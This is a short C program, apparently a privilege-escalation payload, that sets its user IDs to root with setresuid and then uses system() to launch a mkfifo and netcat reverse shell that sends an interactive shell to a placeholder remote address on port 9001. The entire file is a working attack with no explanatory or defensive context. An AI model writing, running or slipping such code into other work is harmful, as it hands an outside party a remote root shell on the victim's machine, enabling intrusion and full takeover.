#define _GNU_SOURCE  
#include <unistd.h>
#include <stdlib.h>
int main(void)
{ 
    setresuid(0, 0, 0); 
    system("rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx 9001 >/tmp/g"); 
}
